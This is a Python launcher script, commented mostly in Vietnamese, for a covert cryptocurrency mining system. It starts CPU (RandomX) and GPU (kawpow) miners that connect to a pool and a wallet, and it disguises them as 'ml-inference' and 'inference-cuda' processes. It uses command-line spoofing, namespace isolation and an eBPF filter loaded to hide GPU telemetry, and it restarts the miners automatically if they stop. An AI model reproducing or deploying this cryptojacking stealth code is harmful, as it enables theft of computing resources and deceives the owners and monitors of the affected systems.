"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
"""

import os
import sys
import subprocess
import threading
import signal
import time
from pathlib import Path

# Add the script's directory to sys.path to resolve local module imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import psutil
# Import cloaking utilities cho ml-inference process stealth
from cloaking_lib.utils import get_process_by_cmdline, spoof_cmdline, restore_cmdline, create_stealth_subprocess

# Import các module từ thư viện mining_environment
from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts import setup_env, system_manager
from mining_environment.scripts.privileged_operations import get_privileged_manager
from mining_environment.config.ml_inference_config import get_ml_inference_config

# Thiết lập đường dẫn logs
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)
logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')

# Import optimized mining components (if available)
try:
    from mining_environment.cpu_plugins.optimization.system_integration import (
        integrate_with_existing_system, 
        SystemIntegrationConfig
    )
    OPTIMIZED_MINING_AVAILABLE = True
    logger.info("✅ OptimizedCalculationChain available - enhanced performance mode enabled")
except ImportError as e:
    OPTIMIZED_MINING_AVAILABLE = False
    logger.info(f"ℹ️ OptimizedCalculationChain not available: {e} - using legacy mining mode")
stop_event = threading.Event()
process_lock = threading.Lock()
cpu_process = None
gpu_process = None

# Global variables cho optimized mining
optimized_integration = None
use_optimized_mining = os.getenv('USE_OPTIMIZED_MINING', '1') == '1'

def signal_handler(signum, frame):
    logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    logger.info("Bắt đầu thiết lập môi trường khai thác.")
    try:
        # Load ML inference configuration
        ml_config = get_ml_inference_config(logger)
        if not ml_config.validate_configuration():
            logger.error("❌ ML inference configuration validation failed")
            sys.exit(1)
        
        # Apply CPU optimizations từ config
        ml_config.apply_cpu_optimizations()
        
        # Setup environment variables từ config
        env_vars = ml_config.get_environment_variables()
        for key, value in env_vars.items():
            os.environ[key] = value
        
        logger.info(f"🔧 ML Inference Config: {ml_config}")
        
        privileged_manager = get_privileged_manager(logger)
        security_context = privileged_manager.validate_security_context()
        logger.info(f"Security Context: User={security_context['user']}, Root={security_context['is_root']}")
        if not security_context['is_root']:
            logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
        
        gpu_info = privileged_manager.check_gpu_access()
        logger.info(f"GPU Access: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
        
        if os.getenv('ENABLE_EBPF_CLOAK', '1') == '1':
            preferred_path = "/opt/ebpf_filters/gpu_telemetry_filter.bpf.o"
            legacy_path = "/opt/ebpf_filters/gpu_filter.o"
            ebpf_path = preferred_path if os.path.exists(preferred_path) else legacy_path
            if os.path.exists(ebpf_path) and os.path.getsize(ebpf_path) > 0:
                if privileged_manager.load_ebpf_program(ebpf_path):
                    logger.info("✅ Đã load eBPF telemetry filter thành công")
                else:
                    logger.warning("⚠️ Không thể load eBPF telemetry filter")
            else:
                logger.info("ℹ️ eBPF filter object không tồn tại, chạy ở mock mode")
        
        setup_env.setup()
        logger.info("Thiết lập môi trường thành công.")
        return privileged_manager
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập môi trường: {e}")
        sys.exit(1)
        
def start_system_manager():
    logger.info("Khởi động Resource Manager...")
    try:
        system_manager.start()
        logger.info("Resource Manager đã được khởi động.")
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        stop_system_manager()

def stop_system_manager():
    logger.info("Đang dừng Resource Manager...")
    try:
        system_manager.stop()
        logger.info("Resource Manager đã được dừng thành công.")
    except Exception as e:
        logger.error(f"Lỗi khi dừng Resource Manager: {e}")

def is_mining_process_running(process):
    return process and process.poll() is None

def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
    """
    Start mining process với stealth capabilities cho ml-inference.
    Supports both traditional subprocess và OptimizedCalculationChain.
    """
    executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
    if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Biến môi trường MINING_SERVER hoặc MINING_WALLET không được thiết lập.")
        stop_event.set()
        return None

    miner_tag = 'cpu' if cpu else 'gpu'
    miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
    miner_log_file = open(miner_log_path, 'ab', buffering=0)

    # Determine process name from resource_config.json
    process_name = "ml-inference" if cpu else "inference-cuda"
    
    mining_command = [executable, '-o', mining_server, '-u', mining_wallet, '--tls']
    if cpu:
        mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
    else:
        cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])

    enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
    enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
    
    if enable_ns and privileged_manager:
        logger.info("Sử dụng PrivilegedOperationManager cho namespace isolation")

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần {attempt}/{retries})...")
        try:
            if enable_stealth and cpu:
                # Use stealth subprocess for CPU mining (ml-inference)
                process = create_stealth_subprocess(
                    mining_command,
                    fake_name=process_name,
                    stdout=miner_log_file,
                    stderr=subprocess.STDOUT,
                    bufsize=1
                )
                if process:
                    logger.info(f"✅ Stealth process '{process_name}' started with PID: {process.pid}")
            elif enable_ns and privileged_manager:
                process = privileged_manager.create_namespace_isolation(mining_command)
            else:
                process = subprocess.Popen(mining_command, stdout=miner_log_file, stderr=subprocess.STDOUT, bufsize=1)
            
            if process:
                logger.info(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} đã được khởi động với PID: {process.pid}")
                time.sleep(2)
                if process.poll() is not None:
                    logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
                    process = None
                else:
                    return process
                    
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
            process = None
        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)
    logger.error(f"Không thể khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'}.")
    stop_event.set()
    return None

def initialize_optimized_mining(privileged_mgr):
    """
    Initialize OptimizedCalculationChain với ml-inference process integration.
    Enhanced để fix CPU utilization 0% issue.
    """
    global optimized_integration
    
    if not OPTIMIZED_MINING_AVAILABLE or not use_optimized_mining:
        logger.info("OptimizedCalculationChain not enabled, falling back to legacy mining")
        return False
    
    try:
        logger.info("Initializing OptimizedCalculationChain...")
        
        # Get configuration từ MLInferenceConfig
        ml_config = get_ml_inference_config(logger)
        cores = ml_config.get_max_cpu_threads()
        
        logger.info(f"🚀 Initializing với {cores} cores cho {ml_config.get_cpu_process_name()}")
        
        # Create integration config với stealth mode
        config = SystemIntegrationConfig(
            enable_optimized_chain=True,
            fallback_to_legacy=True,
            throttling_compatibility=True,
            monitoring_enabled=True,
            auto_performance_tuning=True,
            stealth_mode_compatible=ml_config.is_stealth_mode_enabled()
        )
        
        # Initialize system integration
        optimized_integration = integrate_with_existing_system(
            cores=cores,
            throttling_manager=None,  # Will be injected later
            logger=logger
        )
        
        if optimized_integration:
            # Use enhanced mining session config từ MLInferenceConfig
            from mining_environment.cpu_plugins.optimization.mining_integration_adapter import MiningSessionConfig
            
            # Get optimized config từ MLInferenceConfig
            config_data = ml_config.get_mining_session_config()
            session_config = MiningSessionConfig(
                profile=config_data["profile"],
                total_iterations=config_data["total_iterations"],
                batch_size=config_data["batch_size"],
                monitoring_interval=config_data["monitoring_interval"],
                auto_restart=config_data["auto_restart"],
                throttling_enabled=config_data["throttling_enabled"],
                stealth_mode=config_data["stealth_mode"]
            )
            
            # Start optimized mining session với enhanced config
            if optimized_integration.start_optimized_mining(session_config):
                logger.info("✅ OptimizedCalculationChain đã khởi động thành công")
                
                # Verify actual CPU workers are running
                time.sleep(2)
                status = optimized_integration.get_system_performance_status()
                if status.get('optimized_mining_active', False):
                    logger.info("🚀 Sử dụng OptimizedCalculationChain cho CPU mining")
                    return True
                else:
                    logger.error("❌ OptimizedCalculationChain started but not active")
                    return False
            else:
                logger.error("❌ Không thể khởi động OptimizedCalculationChain")
                optimized_integration.cleanup()
                optimized_integration = None
                return False
        else:
            logger.error("❌ Không thể tạo OptimizedSystemIntegration")
            return False
            
    except Exception as e:
        logger.error(f"Lỗi khi khởi tạo OptimizedCalculationChain: {e}")
        if optimized_integration:
            optimized_integration.cleanup()
            optimized_integration = None
        return False

def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
    """
    Quản lý vòng đời của CPU miner, bao gồm khởi động lại và áp dụng throttling.
    Enhanced với OptimizedCalculationChain support.
    """
    global cpu_process, optimized_integration
    retries = 0
    
    # Try optimized mining first
    if initialize_optimized_mining(privileged_mgr):
        logger.info("🚀 Sử dụng OptimizedCalculationChain cho CPU mining")
        
        # Monitor optimized mining
        while not stop_event.is_set() and retries < max_retries:
            try:
                if optimized_integration and optimized_integration.optimized_mining_active:
                    # Get performance status
                    status = optimized_integration.get_system_performance_status()
                    if status.get('optimized_mining_active', False):
                        # Reset retries if mining is active
                        retries = 0
                        
                        # Log performance periodically
                        if status.get('mining_performance'):
                            perf = status['mining_performance']
                            logger.debug(f"OptimizedMining: {perf['total_cpu_utilization']:.1f}% CPU, "
                                       f"{perf['hashrate']:.2f} H/s, {perf['active_workers']} workers")
                    else:
                        # Optimized mining stopped, try to restart
                        logger.warning("OptimizedCalculationChain stopped, attempting restart...")
                        if not optimized_integration.start_optimized_mining():
                            retries += 1
                            logger.error(f"Failed to restart OptimizedCalculationChain ({retries}/{max_retries})")
                else:
                    # Integration lost, try to reinitialize
                    logger.warning("OptimizedSystemIntegration lost, attempting reinitialize...")
                    if not initialize_optimized_mining(privileged_mgr):
                        retries += 1
                        logger.error(f"Failed to reinitialize optimized mining ({retries}/{max_retries})")
                
                # Wait before next check
                stop_event.wait(30)
                
            except Exception as e:
                logger.error(f"Error trong optimized mining monitoring: {e}")
                retries += 1
                stop_event.wait(10)
        
        # If optimized mining failed too many times, cleanup and fallback
        if retries >= max_retries:
            logger.error("OptimizedCalculationChain thất bại quá nhiều lần, fallback to legacy mining")
            if optimized_integration:
                optimized_integration.cleanup()
                optimized_integration = None
        else:
            # Optimized mining completed successfully
            return
    
    # Fallback to legacy mining process
    logger.info("🔄 Fallback to legacy subprocess-based CPU mining")
    retries = 0
    while not stop_event.is_set() and retries < max_retries:
        with process_lock:
            if not is_mining_process_running(cpu_process):
                cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_mgr)
                # Logic throttling đã được chuyển hoàn toàn cho CPU Plugin Framework
                # Việc gọi setup_cpu_throttling(cpu_process) đã bị loại bỏ tại đây
                if not is_mining_process_running(cpu_process):
                    retries += 1
                    logger.warning(f"CPU miner khởi động thất bại. Thử lại... ({retries}/{max_retries})")
                else:
                    logger.info("CPU miner đã khởi động, việc quản lý throttling được giao cho ResourceManager.")
                    retries = 0  # Reset retries on successful start
            else:
                # Nếu process đang chạy, reset retries
                retries = 0
        
        # Đợi trước khi kiểm tra lại
        stop_event.wait(30)
    if retries >= max_retries:
        logger.error("CPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()

def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
    """
    Quản lý vòng đời của GPU miner. Hàm này không chứa logic throttling.
    """
    global gpu_process
    retries = 0
    while not stop_event.is_set() and retries < max_retries:
        with process_lock:
            process = gpu_process
        if not is_mining_process_running(process):
            if process:
                logger.warning("Phát hiện GPU miner đã dừng. Thử khởi động lại...")
                retries += 1
            new_process = start_mining_process(cpu=False, privileged_manager=privileged_mgr)
            with process_lock:
                gpu_process = new_process
        time.sleep(15)
    if retries >= max_retries:
        logger.error("GPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()

def main():
    """
    Redesigned main function với Parallel Initialization Framework.
    Theo blueprint: Khởi tạo song song CPU và GPU mining processes + 
    kích hoạt đồng thời các modules trong scripts/.
    """
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Parallel Architecture) =====")
    
    # Khởi tạo môi trường
    privileged_manager = initialize_environment()
    
    # Khởi động Resource Manager (System Manager)
    start_system_manager()
    
    # Tạo threads để chạy song song CPU và GPU mining
    cpu_thread = threading.Thread(target=manage_cpu_miner, args=(privileged_manager,), daemon=True, name="CPUMiningThread")
    gpu_thread = threading.Thread(target=manage_gpu_miner, args=(privileged_manager,), daemon=True, name="GPUMiningThread")
    
    # Khởi động các threads song song
    logger.info("🚀 Khởi động parallel mining threads...")
    cpu_thread.start()
    
    # Khởi động GPU thread nếu được cấu hình
    if os.getenv('MINING_SERVER_GPU') and os.getenv('MINING_WALLET_GPU'):
        gpu_thread.start()
        logger.info("✅ Đã khởi động cả CPU và GPU mining threads")
    else:
        logger.info("✅ Chỉ khởi động CPU mining thread (GPU không được cấu hình)")
    
    # Đợi các threads hoạt động và xử lý tín hiệu dừng
    try:
        while not stop_event.is_set():
            # Kiểm tra trạng thái threads
            if not cpu_thread.is_alive():
                logger.warning("⚠️ CPU mining thread đã dừng")
            if gpu_thread.is_alive() and not gpu_thread.is_alive():
                logger.warning("⚠️ GPU mining thread đã dừng")
            
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
        stop_event.set()
    
    # Dừng system manager
    stop_system_manager()
    
    # Cleanup và thoát
    logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
    
    # Cleanup optimized mining first
    global optimized_integration
    if optimized_integration:
        logger.info("Dừng OptimizedCalculationChain...")
        try:
            optimized_integration.cleanup()
            optimized_integration = None
            logger.info("✅ OptimizedCalculationChain đã dừng")
        except Exception as e:
            logger.error(f"Lỗi khi dừng OptimizedCalculationChain: {e}")
    
    # Cleanup legacy processes
    with process_lock:
        if cpu_process:
            logger.info(f"Dừng tiến trình CPU miner (PID: {cpu_process.pid})...")
            cpu_process.terminate()
        if gpu_process:
            logger.info(f"Dừng tiến trình GPU miner (PID: {gpu_process.pid})...")
            gpu_process.terminate()
    
    logger.info("Hệ thống đã dừng. Thoát.")

if __name__ == "__main__":
    main()
